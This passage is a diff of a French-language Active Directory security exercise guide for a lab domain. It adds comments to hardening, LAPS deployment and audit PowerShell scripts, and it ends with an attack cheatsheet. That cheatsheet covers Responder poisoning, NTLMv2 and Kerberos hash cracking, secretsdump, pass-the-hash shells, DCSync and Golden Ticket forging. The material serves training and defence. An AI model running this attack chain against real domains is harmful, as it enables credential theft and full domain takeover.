+            -MinPasswordAge 1 `                  # 1 jour minimum avant changement (anti-rejeu)
+            -PasswordHistoryCount 24 `           # Mémorise les 24 derniers mots de passe
+            -ReversibleEncryptionEnabled $false ` # Pas de stockage réversible (chiffrement faible)
+            -ComplexityEnabled $true `            # Complexité obligatoire (majuscule, chiffre, spécial)
+            -LockoutThreshold 5 `                 # Verrouillage après 5 tentatives échouées
+            -LockoutDuration 30 `                 # Durée de verrouillage : 30 minutes
+            -LockoutObservationWindow 30          # Fenêtre d'observation : 30 minutes
 
         Write-Host "  ✓ Politique de mot de passe appliquée" -ForegroundColor Green
     } else {
@@ -1684,6 +2236,20 @@ Write-Host "=== Durcissement terminé ===" -ForegroundColor Cyan
 Write-Host "Certains changements nécessitent un redémarrage." -ForegroundColor Magenta
 ```
 
+**Explication des principales commandes du script :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `[Security.Principal.WindowsPrincipal]::new(...).IsInRole(...)` | Vérifie si le script est exécuté avec les droits Administrateur |
+| `Set-ItemProperty -Path HKLM:\... -Name "EnableMulticast" -Value 0` | Désactive LLMNR (résolution de noms multicast) |
+| `$adapter.SetTcpipNetbios(2)` | Désactive NetBIOS sur TCP/IP (2 = désactivé) via WMI |
+| `Set-ItemProperty ... RequireSecuritySignature -Value 1` | Active la signature SMB obligatoire (anti-relay) |
+| `Set-ItemProperty ... LsaCfgFlags -Value 1` | Active Credential Guard (isole LSASS dans un conteneur virtualisé) |
+| `Set-ItemProperty ... WDigest\UseLogonCredential -Value 0` | Empêche WDigest de stocker le mot de passe en clair en mémoire |
+| `Set-ItemProperty ... RemoteRegAccess -Value 1` | Restreint l'accès distant au registre |
+| `Set-ADUser -Replace @{"msDS-SupportedEncryptionTypes" = 24}` | Configure AES128+AES256 pour les comptes de service (désactive RC4) |
+| `Set-ADDefaultDomainPasswordPolicy -MinPasswordLength 14 ...` | Applique une politique de mot de passe forte (conforme NIS2) |
+
 #### 9.2.2 Déploiement LAPS automatisé
 
 ```powershell
@@ -1695,21 +2261,26 @@ Write-Host "Certains changements nécessitent un redémarrage." -ForegroundColor
     Nécessite le fichier d'installation LAPS.x64.msi disponible sur le partage.
 #>
 
+# Variables de configuration
 $domain = "corp.shadow.local"
+# Chemin de l'installateur LAPS sur le partage SYSVOL du DC
 $lapsInstaller = "\\DC01\SYSVOL\corp.shadow.local\scripts\LAPS.x64.msi"
 
 Write-Host "=== Déploiement LAPS ===" -ForegroundColor Cyan
 
-# Vérifier la présence de l'installateur
+# Vérifier la présence du fichier d'installation avant de commencer
 if (-not (Test-Path $lapsInstaller)) {
     Write-Error "Installateur LAPS introuvable : $lapsInstaller"
     exit 1
 }
 
-# Étape 1 : Étendre le schéma AD
+# Étape 1 : Étendre le schéma AD avec les attributs LAPS
+# Ajoute les attributs ms-Mcs-AdmPwd et ms-Mcs-AdmPwdExpirationTime
 Write-Host "[1/5] Extension du schéma AD..." -ForegroundColor Yellow
 try {
+    # Import-Module AdmPwd.PS charge le module LAPS (fourni avec l'installateur)
     Import-Module AdmPwd.PS -ErrorAction Stop
+    # Update-AdmPwdADSchema modifie le schéma AD pour ajouter les attributs LAPS
     Update-AdmPwdADSchema
     Write-Host "  ✓ Schéma AD étendu" -ForegroundColor Green
 } catch {
@@ -1717,15 +2288,18 @@ try {
     exit 1
 }
 
-# Étape 2 : Déléguer les droits
+# Étape 2 : Déléguer les droits aux ordinateurs pour qu'ils puissent écrire leur mot de passe
 Write-Host "[2/5] Délégation des droits..." -ForegroundColor Yellow
 try {
+    # Liste des unités d'organisation (OU) à configurer
     $ous = @(
         "OU=Workstations,DC=corp,DC=shadow,DC=local",
         "OU=Servers,DC=corp,DC=shadow,DC=local"
     )
     foreach ($ou in $ous) {
         try {
+            # Set-AdmPwdComputerSelfPermission donne aux ordinateurs de l'OU
+            # le droit d'écrire leur propre mot de passe dans l'attribut AD
             Set-AdmPwdComputerSelfPermission -OrgUnit $ou
             Write-Host "  ✓ Droits délégués pour $ou" -ForegroundColor Green
         } catch {
@@ -1736,14 +2310,18 @@ try {
     Write-Error "  ✗ Échec : $_"
 }
 
-# Étape 3 : Installer le client LAPS sur toutes les machines via GPO
+# Étape 3 : Créer une GPO pour déployer le client LAPS sur toutes les machines
 Write-Host "[3/5] Création de la GPO de déploiement LAPS..." -ForegroundColor Yellow
 try {
     $gpoName = "LAPS - Local Admin Password Solution"
+    # Get-GPO vérifie si la GPO existe déjà (pour éviter les doublons)
     $gpo = Get-GPO -Name $gpoName -ErrorAction SilentlyContinue
 
     if (-not $gpo) {
+        # New-GPO crée une nouvelle GPO avec description
         $gpo = New-GPO -Name $gpoName -Comment "Déploie LAPS sur toutes les machines"
+        # Set-GPRegistryValue configure une valeur registre via GPO
+        # AdmPwdEnabled = 1 active LAPS sur les machines cibles
         Set-GPRegistryValue `
             -Name $gpoName `
             -Key "HKLM\Software\Policies\Microsoft Services\AdmPwd" `
@@ -1751,10 +2329,10 @@ try {
             -Type DWord `
             -Value 1
 
-        # Lier la GPO au domaine
+        # New-GPLink lie la GPO au domaine (elle s'appliquera à toutes les machines)
         New-GPLink -Name $gpoName -Target "dc=corp,dc=shadow,dc=local"
 
-        # Délégation de lecture pour les comptes autorisés
+        # Set-GPPermission donne le droit de lecture aux ordinateurs du domaine
         Set-GPPermission -Name $gpoName -TargetType Computer -TargetName "Domain Computers" -PermissionLevel Read
 
         Write-Host "  ✓ GPO $gpoName créée" -ForegroundColor Green
@@ -1765,17 +2343,19 @@ try {
     Write-Error "  ✗ Échec : $_"
 }
 
-# Étape 4 : Vérifier LAPS
+# Étape 4 : Vérifier que LAPS est correctement installé
 Write-Host "[4/5] Vérification de LAPS..." -ForegroundColor Yellow
 try {
-    # Vérifier que LAPS est installé sur le DC
+    # Vérifier que LAPS est installé sur le DC via WMI
     $lapsInstalled = Get-WmiObject -Class Win32_Product | Where-Object { $_.Name -like "*LAPS*" }
     if (-not $lapsInstalled) {
         Write-Warning "  ⚠ LAPS n'est pas installé sur le DC — installation en cours..."
+        # Start-Process msiexec.exe lance l'installateur Windows
+        # /i = install, /quiet = silencieux, -Wait = attend la fin
         Start-Process msiexec.exe -ArgumentList "/i $lapsInstaller /quiet" -Wait
     }
 
-    # Vérifier les attributs AD
+    # Vérifier que les attributs AD LAPS existent dans le schéma
     $schema = Get-ADObject "CN=ms-Mcs-AdmPwd,CN=Schema,CN=Configuration,DC=corp,DC=shadow,DC=local" `
         -ErrorAction SilentlyContinue
     if ($schema) {
@@ -1785,14 +2365,18 @@ try {
     Write-Error "  ✗ Échec : $_"
 }
 
-# Étape 5 : Rapport
+# Étape 5 : Générer un rapport des mots de passe administrateur LAPS
 Write-Host "[5/5] Génération du rapport..." -ForegroundColor Yellow
 try {
-    # Lister les mots de passe administrateur locaux
+    # Get-ADComputer liste tous les ordinateurs du domaine
+    # -Properties ms-Mcs-AdmPwd récupère l'attribut contenant le mot de passe
+    # Where-Object filtre : ne garder que les machines ayant un mot de passe LAPS
+    # Select-Object formate la sortie avec Nom, Mot de passe et Expiration
     Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime | `
         Where-Object { $_.'ms-Mcs-AdmPwd' -ne $null } | `
         Select-Object Name, @{N="Password";E={$_.'ms-Mcs-AdmPwd'}}, @{N="Expiration";E={
             if ($_.'ms-Mcs-AdmPwdExpirationTime') {
+                # [DateTime]::FromFileTime convertit un timestamp Windows FileTime en DateTime
                 [DateTime]::FromFileTime($_.'ms-Mcs-AdmPwdExpirationTime')
             }
         }} | Format-Table -AutoSize
@@ -1807,19 +2391,38 @@ Write-Host "Les clients appliqueront la GPO lors de leur prochaine actualisation
 Write-Host "Pour forcer : gpupdate /force sur chaque machine." -ForegroundColor Magenta
 ```
 
+**Explication des principales commandes du script LAPS :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `Test-Path $lapsInstaller` | Vérifie que le fichier d'installation LAPS existe sur le partage SYSVOL |
+| `Import-Module AdmPwd.PS` | Charge le module PowerShell LAPS pour la gestion administrative |
+| `Update-AdmPwdADSchema` | Étend le schéma AD avec les attributs LAPS (ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime) |
+| `Set-AdmPwdComputerSelfPermission -OrgUnit $ou` | Délègue aux ordinateurs d'une OU le droit d'écrire leur mot de passe LAPS dans AD |
+| `New-GPO -Name "LAPS..."` | Crée une GPO pour déployer la configuration LAPS sur tout le domaine |
+| `Set-GPRegistryValue ... AdmPwdEnabled = 1` | Active LAPS via la GPO (valeur registre) |
+| `New-GPLink -Name $gpo -Target "dc=..."` | Lie la GPO au domaine pour application à toutes les machines |
+| `Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd` | Liste les mots de passe administrateur LAPS de toutes les machines du domaine |
+
 ### 9.3 Audit de sécurité post-exercice
 
 ```powershell
 <#
 .SYNOPSIS
     Script d'audit rapide pour vérifier les vulnérabilités corrigées
+.DESCRIPTION
+    Vérifie que toutes les mesures de durcissement du script 9.2.1
+    ont bien été appliquées sur le domaine CorpShadow
 #>
 
 Write-Host "=== Audit de sécurité CorpShadow ===" -ForegroundColor Cyan
 
+# Tableau pour stocker les résultats des tests
 $results = @()
 
-# 1. Vérifier LLMNR
+# 1. Vérifier que LLMNR est désactivé
+# Get-ItemProperty lit la valeur EnableMulticast dans le registre
+# Si la valeur est 0, LLMNR est désactivé ; sinon il est vulnérable
 $llmnr = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" `
     -Name "EnableMulticast" -ErrorAction SilentlyContinue
 $results += [PSCustomObject]@{
@@ -1827,7 +2430,8 @@ $results += [PSCustomObject]@{
     Status = if ($llmnr.EnableMulticast -eq 0) { "✓ OK" } else { "✗ VULNÉRABLE" }
 }
 
-# 2. Vérifier SMB Signing
+# 2. Vérifier que SMB Signing est activé (côté serveur)
+# RequireSecuritySignature = 1 signifie que la signature SMB est obligatoire
 $smbServer = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" `
     -Name "RequireSecuritySignature" -ErrorAction SilentlyContinue
 $results += [PSCustomObject]@{
@@ -1835,7 +2439,8 @@ $results += [PSCustomObject]@{
     Status = if ($smbServer.RequireSecuritySignature -eq 1) { "✓ OK" } else { "✗ VULNÉRABLE" }
 }
 
-# 3. Vérifier Credential Guard
+# 3. Vérifier que Credential Guard est activé
+# LsaCfgFlags >= 1 signifie que Credential Guard est actif
 $lsaCfg = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
     -Name "LsaCfgFlags" -ErrorAction SilentlyContinue
 $results += [PSCustomObject]@{
@@ -1843,7 +2448,8 @@ $results += [PSCustomObject]@{
     Status = if ($lsaCfg.LsaCfgFlags -ge 1) { "✓ OK" } else { "✗ VULNÉRABLE" }
 }
 
-# 4. Vérifier WDigest
+# 4. Vérifier que WDigest est désactivé (pas de stockage en clair)
+# UseLogonCredential = 0 signifie que le stockage en clair est désactivé
 $wdigest = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" `
     -Name "UseLogonCredential" -ErrorAction SilentlyContinue
 $results += [PSCustomObject]@{
@@ -1851,21 +2457,26 @@ $results += [PSCustomObject]@{
     Status = if ($wdigest.UseLogonCredential -eq 0) { "✓ OK" } else { "✗ VULNÉRABLE" }
 }
 
-# 5. Vérifier Remote Registry
+# 5. Vérifier que le service Remote Registry est arrêté
+# Get-Service interroge le gestionnaire de services Windows
+# Status "Stopped" signifie que le service est désactivé (empêche l'accès distant au registre)
 $remoteReg = Get-Service -Name "RemoteRegistry" -ErrorAction SilentlyContinue
 $results += [PSCustomObject]@{
     Test = "Remote Registry désactivé"
     Status = if ($remoteReg.Status -eq "Stopped") { "✓ OK" } else { "✗ VULNÉRABLE" }
 }
 
-# 6. Vérifier LAPS
+# 6. Vérifier que LAPS est installé
+# Get-WmiObject interroge WMI pour lister les logiciels installés
+# Where-Object filtre pour trouver ceux contenant "LAPS" dans leur nom
 $lapsInstalled = Get-WmiObject -Class Win32_Product | Where-Object { $_.Name -like "*LAPS*" }
 $results += [PSCustomObject]@{
     Test = "LAPS installé"
     Status = if ($lapsInstalled) { "✓ OK" } else { "⚠ Non installé" }
 }
 
-# 7. Vérifier la politique de mot de passe
+# 7. Vérifier la longueur minimale du mot de passe
+# Get-ADDefaultDomainPasswordPolicy récupère la politique de mot de passe du domaine
 try {
     $policy = Get-ADDefaultDomainPasswordPolicy -ErrorAction Stop
     $results += [PSCustomObject]@{
@@ -1873,15 +2484,17 @@ try {
         Status = if ($policy.MinPasswordLength -ge 14) { "✓ OK ($($policy.MinPasswordLength))" } else { "✗ VULNÉRABLE ($($policy.MinPasswordLength))" }
     }
 } catch {
+    # Si le module AD n'est pas disponible, on ne peut pas vérifier
     $results += [PSCustomObject]@{
         Test = "Politique mot de passe"
         Status = "⚠ Impossible de vérifier"
     }
 }
 
-# Afficher les résultats
+# Afficher les résultats sous forme de tableau
 $results | Format-Table -AutoSize
 
+# Compter le nombre de vulnérabilités et afficher un résumé
 $vulnerable = $results | Where-Object { $_.Status -like "*VULNÉRABLE*" }
 if ($vulnerable) {
     Write-Host "ATTENTION : $($vulnerable.Count) point(s) vulnérable(s) détecté(s) !" -ForegroundColor Red
@@ -1889,6 +2502,20 @@ if ($vulnerable) {
     Write-Host "Aucune vulnérabilité critique détectée." -ForegroundColor Green
 }
 ```
+
+**Explication des commandes du script d'audit :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `Get-ItemProperty ... EnableMulticast` | Vérifie si LLMNR est désactivé (0 = OK, 1 = vulnérable) |
+| `Get-ItemProperty ... RequireSecuritySignature` | Vérifie si la signature SMB est obligatoire (1 = OK) |
+| `Get-ItemProperty ... LsaCfgFlags` | Vérifie si Credential Guard est actif (>= 1 = OK) |
+| `Get-ItemProperty ... UseLogonCredential` | Vérifie si WDigest est désactivé (0 = OK) |
+| `Get-Service -Name "RemoteRegistry"` | Vérifie si le service Remote Registry est arrêté (Stopped = OK) |
+| `Get-WmiObject -Class Win32_Product \| Where-Object { \$_.Name -like "*LAPS*" }` | Vérifie si LAPS est installé via WMI |
+| `Get-ADDefaultDomainPasswordPolicy` | Vérifie la politique de mot de passe du domaine (>= 14 caractères = OK) |
+| `$results \| Format-Table -AutoSize` | Affiche les résultats dans un tableau formaté automatiquement |
+| `Where-Object { \$_.Status -like "*VULNÉRABLE*" }` | Filtre les résultats vulnérables pour le résumé |
 
 ### 9.4 Guide de réponse NIS2
 
@@ -1974,67 +2601,113 @@ if ($vulnerable) {
 ## Annexe A : Aide-mémoire rapide (cheatsheet)
 
 ```bash
-# === PHASE 1 : ÉNUMÉRATION ===
+# ============================================
+# PHASE 1 : ÉNUMÉRATION ACTIVE DIRECTORY
+# ============================================
 
-# BloodHound (ingestor)
+# BloodHound (ingestor) — cartographie complète du domaine
+# Collecte : utilisateurs, groupes, ordinateurs, ACL, sessions, trusts
 bloodhound-python -d corp.shadow.local -ns 10.10.10.10 -c all
 
-# ldapsearch manuel
+# ldapsearch manuel — alternative à BloodHound pour lister les utilisateurs
+# -x : authentification simple, -H : serveur LDAP, -b : base de recherche
+# -s sub : recherche récursive, filtre : objets utilisateur, attribut : sAMAccountName
 ldapsearch -x -H ldap://10.10.10.10 -b "DC=corp,DC=shadow,DC=local" -s sub "(objectClass=user)" sAMAccountName
 
-# === PHASE 2 : CAPTURE DE HASH ===
+# ============================================
+# PHASE 2 : CAPTURE DE HASH NTLMv2
+# ============================================
 
-# Responder
+# Responder — empoisonneur LLMNR/NBT-NS/mDNS
+# -I eth0 : interface réseau, -r : NBT-NS, -d : DHCP, -w : WPAD, -v : verbeux
 sudo responder -I eth0 -rdwv
 
-# Crack avec john
+# Crack du hash NTLMv2 avec john (the ripper)
+# --wordlist : dictionnaire rockyou.txt (~14 millions de mots de passe courants)
 john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/ntlmv2_hash.txt
 
-# Crack avec hashcat (NTLMv2)
+# Crack avec hashcat (plus rapide si GPU disponible)
+# -m 5600 : mode NetNTLMv2, --force : ignorer les avertissements
 hashcat -m 5600 /tmp/ntlmv2_hash.txt /usr/share/wordlists/rockyou.txt --force
 
-# === PHASE 3 : DUMP DE HASHES ===
+# ============================================
+# PHASE 3 : DUMP DE HASHES (SAM / LSA)
+# ============================================
 
-# secretsdump
+# secretsdump — extraction des hashes à distance via SMB/registre
+# Format : DOMAINE/utilisateur:'mot_de_passe'@IP_cible
 impacket-secretsdump CORPSHADOW/jdoe:'P@ssw0rd!2025'@10.10.10.20
 
-# === PHASE 4 : PASS-THE-HASH ===
+# ============================================
+# PHASE 4 : PASS-THE-HASH (Mouvement latéral)
+# ============================================
 
-# wmiexec
+# wmiexec — exécution via WMI (furtif, pas de création de service)
+# -hashes LM_HASH:NT_HASH (LM vide = aad3b435b51404eeaad3b435b51404ee)
 impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:<NT_HASH> CORPSHADOW/jdoe@10.10.10.20
 
-# psexec
+# psexec — crée un service Windows (bruyant, facilement détectable)
 impacket-psexec -hashes :<NT_HASH> CORPSHADOW/jdoe@10.10.10.20
 
-# smbexec
+# smbexec — via SVCCTL (plus furtif que psexec, pas de fichier copié)
 impacket-smbexec -hashes :<NT_HASH> CORPSHADOW/jdoe@10.10.10.20
 
-# === PHASE 5 : KERBEROASTING ===
+# ============================================
+# PHASE 5 : KERBEROASTING
+# ============================================
 
-# Lister les SPNs
+# Lister les SPNs (comptes de service avec Service Principal Name)
 impacket-GetUserSPNs CORPSHADOW/jdoe:'P@ssw0rd!2025' -dc-ip 10.10.10.10
 
-# Demander les TGS
+# Demander et exporter les TGS (tickets Kerberos chiffrés avec le hash du service)
+# -request : demande le TGS, -outputfile : sauvegarde pour crack
 impacket-GetUserSPNs CORPSHADOW/jdoe:'P@ssw0rd!2025' -dc-ip 10.10.10.10 -request -outputfile /tmp/tgs.txt
 
-# Crack du TGS (hashcat)
+# Crack du TGS avec hashcat (mode Kerberos 5 TGS-REP, etype 23 = RC4-HMAC)
+# -m 13100 : mode Kerberos 5 TGS-REP, --force : ignorer les avertissements
 hashcat -m 13100 /tmp/tgs.txt /usr/share/wordlists/rockyou.txt --force
 
-# === PHASE 6 : DCSYNC + GOLDEN TICKET ===
+# ============================================
+# PHASE 6 : DCSYNC + GOLDEN TICKET
+# ============================================
 
-# DCSync
+# DCSync — extraire tous les hashes du domaine (nécessite privilèges admin)
+# -just-dc : utilise DRSUAPI pour répliquer NTDS.dit
 impacket-secretsdump CORPSHADOW/Administrator@10.10.10.10 -just-dc
 
-# Récupérer le SID du domaine
+# Récupérer le SID du domaine (nécessaire pour le Golden Ticket)
+# lookupsid interroge via SAMR ; grep filtre la ligne "Domain SID"
 impacket-lookupsid CORPSHADOW/jdoe:'P@ssw0rd!2025'@10.10.10.10 | grep "Domain SID"
 
-# Créer le Golden Ticket
+# Créer le Golden Ticket (TGT forgé avec le hash KRBTGT)
+# -nthash : hash NTLM de KRBTGT, -domain-sid : SID du domaine
+# -groups 512,519,518 : Domain Admins, Schema Admins, Enterprise Admins
 impacket-ticketer -nthash <KRBTGT_NT_HASH> -domain-sid <SID> -domain corp.shadow.local -groups 512,519,518 Administrator
 
-# Utiliser le Golden Ticket
+# Utiliser le Golden Ticket : exporter le cache Kerberos et lancer smbexec
+# KRB5CCNAME : variable d'environnement pointant vers le fichier de ticket
+# -k : authentification Kerberos, -no-pass : pas de mot de passe (ticket)
 export KRB5CCNAME=/tmp/administrator.ccache
 impacket-smbexec -k -no-pass CORPSHADOW/Administrator@DC01.corp.shadow.local
 ```
+
+**Explication des commandes de l'aide-mémoire :**
+
+| Phase | Commande | Rôle |
+|-------|----------|------|
+| **1. Énumération** | `bloodhound-python -d <domaine> -ns <DNS> -c all` | Cartographie AD complète (utilisateurs, groupes, ACL, etc.) |
+| **1. Énumération** | `ldapsearch -x -H ldap://... -b "DC=..." -s sub "(objectClass=user)" sAMAccountName` | Liste manuelle des utilisateurs via LDAP |
+| **2. Capture** | `sudo responder -I eth0 -rdwv` | Empoisonnement LLMNR/NBT-NS/WPAD pour capture de hash NTLMv2 |
+| **2. Capture** | `john --wordlist=rockyou.txt /tmp/ntlmv2_hash.txt` | Crack du hash NTLMv2 par dictionnaire |
+| **2. Capture** | `hashcat -m 5600 ... --force` | Crack du hash NTLMv2 par GPU (mode 5600 = NetNTLMv2) |
+| **3. Dump** | `impacket-secretsdump DOMAINE/user:pass@IP` | Extraction des hashes SAM/LSA à distance via SMB |
+| **4. PtH** | `impacket-wmiexec -hashes LM:NT user@IP` | Shell distant via WMI (furtif) |
+| **4. PtH** | `impacket-psexec -hashes :NT user@IP` | Shell distant via service (bruyant) |
+| **4. PtH** | `impacket-smbexec -hashes :NT user@IP` | Shell distant via SVCCTL (furtif) |
+| **5. Kerberoasting** | `impacket-GetUserSPNs user:pass -dc-ip IP` | Liste les SPN (comptes de service kerberoastables) |
+| **5. Kerberoasting** | `hashcat -m 13100 ... --force` | Crack du TGS Kerberos (mode 13100 = TGS-REP etype 23) |
+| **6. DCSync** | `impacket-secretsdump admin@IP -just-dc` | Extraction de tous les hashes du domaine via DRSUAPI |
+| **6. Golden Ticket** | `impacket-ticketer -nthash <KRBTGT> -domain-sid <SID> ...` | Forge un TGT avec le hash KRBTGT pour persistance totale |
 
 ## Annexe B : Glossaire des abréviations
 
